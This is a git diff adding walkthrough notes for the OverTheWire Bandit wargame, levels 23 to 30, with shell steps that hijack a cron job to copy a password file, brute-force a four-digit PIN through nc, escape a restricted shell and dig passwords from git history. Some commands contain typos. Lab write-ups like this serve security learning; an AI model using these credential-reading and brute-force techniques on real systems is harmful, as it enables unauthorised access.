@@ -208,4 +208,94 @@ A program is running automatically at regular intervals from cron, the time-base
 ### Level 23 -> 24
 A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed. | NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level! | NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…
 
-* 
+      * cat /etc/cron.d/cronjob_bandit24
+        cat /usr/bin/cronjob_bandit24.sh
+        mkdir /tmp/(hacker) -> and cd tmp
+        vim test.sh -> #!/bin/bash
+                       cat /etc/bandit_pass/bandit24 > /tmp/(hacker)/(file)
+        touch (file)
+        chmod 777 test.sh
+        chmod 777 (file)
+        cp test.sh /var/spool/bandit24
+        ls -al
+        cat (file)
+
+### Level 24 -> 25
+A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing. You do not need to create new connections each time
+
+      * mkdir /tmp/hacker
+        cd /tmp/hacker
+        vim brf.sh -> #! /bin/bash
+                      pass=(paste the password of the current directory)
+                      for pin in {0000..9999}; do
+                      echo "$pass $pin"
+                      done
+        chmod 777 brf.sh
+        ./brf.sh
+        ./brf.sh | nc localhost 30002
+
+### Level 25 -> 26
+Logging in to bandit26 from bandit25 should be fairly easy… The shell for user bandit26 is not /bin/bash, but something else. Find out what it is, how it works and how to break out of it.
+
+      * ls
+        cat bandit26.sshkey
+        cat /etc/passwd | grep bandit25
+        cat /etc/passwd | grep bandit26
+        cat /usr/bin/showtext
+        ssh bandit26@localhosty -i bandit26.sshkey
+        set shell=/bin/bash
+        shell
+        cat etc/bandit_pass/bandit26
+
+### Level 26 -> 27
+Good job getting a shell! Now hurry and grab the password for bandit27!
+
+      * ls
+        ./bandit27-do id
+        ./bandit27-do cat /etc/bandit_pass/bandit7
+
+### Level 27 -> 28
+There is a git repository at ssh://bandit27-git@localhost/home/bandit27-git/repo. The password for the user bandit27-git is the same as for the user bandit27. | Clone the repository and find the password for the next level.
+
+      * mkdir /tmp/hacker
+        cd /tmp/hacker
+        git clone ssh://bandit27-git@localhost/home/bandit27-git/repo
+        and paste the same password of the current level
+        ls
+        cd repo
+        ls
+        cat readme
+
+### Level 28 -> 29
+There is a git repository at ssh://bandit28-git@localhost/home/bandit28-git/repo. The password for the user bandit28-git is the same as for the user bandit28. | Clone the repository and find the password for the next level.
+
+      * mkdir /tmp/hacker
+        cd /tmp/hacker
+        git clone ssh://bandit28-git@localhost/home/bandit28-git/repo
+        and paste the same password of the current level
+        ls
+        cd repo 
+        ls
+        cat readme.md
+        git show
+
+### Level 29 -> 30
+There is a git repository at ssh://bandit29-git@localhost/home/bandit29-git/repo. The password for the user bandit29-git is the same as for the user bandit29. | Clone the repository and find the password for the next level.
+
+      * mkdir /tmp/hacker
+        cd /tmp/hacker
+        git clone ssh://bandit29-git@localhost/home/bandit29-git/repo
+        and paste the same password of the current level
+        ls
+        cd repo
+        ls
+        cat readme.md
+        git show
+        git branch -a
+        git checkout remotes/origin/dev
+        ls
+        cat readme.md
+
+### Level 30 -> 31
+
+
